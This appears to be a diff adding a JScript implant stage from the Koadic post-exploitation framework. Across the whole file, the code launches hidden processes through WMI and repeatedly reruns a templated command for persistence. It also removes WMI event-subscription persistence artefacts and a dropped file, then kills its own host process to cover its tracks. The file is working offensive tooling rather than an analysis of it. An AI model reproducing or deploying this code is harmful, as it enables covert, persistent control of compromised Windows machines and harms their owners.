@@ -1,0 +1,266 @@
+var Koadic = {};
+
+Koadic.WS = new ActiveXObject("WScript.Shell");
+Koadic.FS = new ActiveXObject("Scripting.FileSystemObject");
+
+Koadic.registry = {};
+Koadic.registry.HKCU = 0x80000001;
+Koadic.registry.HKLM = 0x80000002;
+
+Koadic.isHTA = function()
+{
+    return typeof(window) !== "undefined";
+}
+
+Koadic.process = {};
+
+Koadic.process.currentPID = function()
+{
+    var cmd = Koadic.file.getPath("%comspec% /K hostname");
+    var childPid = Koadic.WMI.createProcess(cmd);
+    var pid = -1;
+    var latestTime = 0;
+    var latestProc = null;
+
+    var processes = Koadic.process.list();
+
+    var items = new Enumerator(processes);
+    while (!items.atEnd())
+    {
+        var proc = items.item();
+
+        try
+        {
+            if (proc.ProcessId == childPid)
+            {
+                latestProc = proc;
+                break;
+            }
+        } catch (e)
+        {
+        }
+        items.moveNext();
+    }
+
+    pid = latestProc.ParentProcessId;
+    latestProc.Terminate();
+
+    return pid;
+}
+
+Koadic.process.kill = function(pid)
+{
+    var processes = Koadic.process.list();
+
+    var items = new Enumerator(processes);
+    while (!items.atEnd())
+    {
+        var proc = items.item();
+
+        try
+        {
+            if (proc.ProcessId == pid)
+            {
+                proc.Terminate();
+                return true;
+            }
+        } catch (e)
+        {
+        }
+        items.moveNext();
+    }
+
+    return false;
+}
+
+Koadic.process.list = function()
+{
+    var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
+    var query = "Select * From Win32_Process";
+
+    return wmi.ExecQuery(query);
+}
+
+Koadic.exit = function()
+{
+    if (Koadic.isHTA())
+    {
+        try {
+          window.close();
+        } catch(e){}
+
+        try {
+          window.self.close();
+        } catch (e){}
+
+        try {
+          window.top.close();
+        } catch (e){}
+
+
+        try{
+            self.close();
+        } catch (e){}
+
+        try
+        {
+            window.open('', '_self', '');
+            window.close();
+        }
+        catch (e)
+        {
+        }
+    }
+
+    try
+    {
+        WScript.quit();
+    }
+    catch (e)
+    {
+    }
+
+    try
+    {
+        var pid = Koadic.process.currentPID();
+        Koadic.process.kill(pid);
+    }
+    catch (e)
+    {
+    }
+}
+
+Koadic.WMI = {};
+
+Koadic.WMI.createProcess = function(cmd)
+{
+    var SW_HIDE = 0;
+    var pid = 0;
+
+    var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2")
+
+    var si = wmi.Get("Win32_ProcessStartup").SpawnInstance_();
+    si.ShowWindow = SW_HIDE;
+    si.CreateFlags = 16777216;
+    si.X = si.Y = si.XSize = si.ySize = 1;
+
+    var w32proc = wmi.Get("Win32_Process");
+
+    var method = w32proc.Methods_.Item("Create");
+    var inParams = method.InParameters.SpawnInstance_();
+    inParams.CommandLine = cmd;
+    inParams.CurrentDirectory = null;
+    inParams.ProcessStartupInformation = si;
+
+    var outParams = w32proc.ExecMethod_("Create", inParams);
+    return outParams.ProcessId;
+}
+
+Koadic.process.kill = function(pid)
+{
+    var processes = Koadic.process.list();
+
+    var items = new Enumerator(processes);
+    while (!items.atEnd())
+    {
+        var proc = items.item();
+
+        try
+        {
+            if (proc.ProcessId == pid)
+            {
+                proc.Terminate();
+                return true;
+            }
+        } catch (e)
+        {
+        }
+        items.moveNext();
+    }
+
+    return false;
+}
+
+Koadic.file = {};
+
+Koadic.file.getPath = function(path)
+{
+    return Koadic.WS.ExpandEnvironmentStrings(path);
+}
+
+Koadic.file.deleteFile = function(path)
+{
+    Koadic.FS.DeleteFile(Koadic.file.getPath(path), true);
+};
+
+Koadic.shell = {};
+Koadic.shell.run = function(cmd, fork)
+{
+    var fork = (typeof(fork) !== "undefined") ? fork : true;
+    var c = "%comspec% /q /c " + cmd;
+    Koadic.WS.Run(cmd, 0, !fork);
+}
+
+Koadic.persist = {};
+Koadic.persist.run = function(cmd)
+{
+    var pid = Koadic.WMI.createProcess(cmd);
+    Koadic.shell.run('ping 127.0.0.1 -n 11', false);
+    return pid;
+}
+
+Koadic.persist.clean = function()
+{
+    var subname = "K0adic";
+    var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\subscription");
+    wmi.Delete("\\\\.\\root\\subscription:__EventFilter.Name=\""+subname+"\"");
+    wmi.Delete("\\\\.\\root\\subscription:CommandLineEventConsumer.Name=\""+subname+"\"");
+    var ftcb = wmi.Get("__FilterToConsumerBinding").Instances_();
+    var instancecount = ftcb.Count;
+    var i;
+    for (i = 0; i < instancecount; i++) {
+        var cons = ftcb.ItemIndex(i);
+        if (cons.Consumer.indexOf(subname) != -1) {
+            cons.Delete_();
+        }
+    }
+    Koadic.file.deleteFile(Koadic.file.getPath("~FDROPDIR~\\~FDROPFILE~"));
+}
+
+try
+{
+    var attempts = ~RETRYATTEMPTS~;
+    var delay = ~RETRYDELAY~ + 1;
+    var infflag = false;
+    if (attempts == -1)
+    {
+        infflag = true;
+    }
+    while (true)
+    {
+        var pid = Koadic.persist.run("~CMD~");
+        if (Koadic.process.kill(pid))
+        {
+            if (!infflag)
+            {
+                attempts -= 1;
+                if (attempts == 0)
+                {
+                    Koadic.persist.clean();
+                    break;
+                }
+            }
+            Koadic.shell.run('ping 127.0.0.1 -n '+delay.toString(), false);
+        }
+        else
+        {
+            break;
+        }
+    }
+}
+catch(e)
+{
+    //do nothing
+}
+
+Koadic.exit();
